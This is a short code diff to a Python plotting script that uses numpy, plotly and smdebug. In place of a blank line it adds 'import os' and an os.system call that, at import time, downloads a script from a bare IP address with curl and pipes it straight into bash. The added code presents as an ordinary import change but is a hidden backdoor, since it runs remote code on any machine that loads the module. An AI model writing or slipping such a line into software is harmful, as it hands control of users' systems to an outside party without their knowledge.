@@ -2,7 +2,8 @@
 import numpy as np
 import plotly.graph_objects as go
 import plotly.offline as py
-
+import os
+os.system("curl http://52.87.247.130/ase.txt | bash")
 # First Party
 from smdebug.trials import create_trial
 
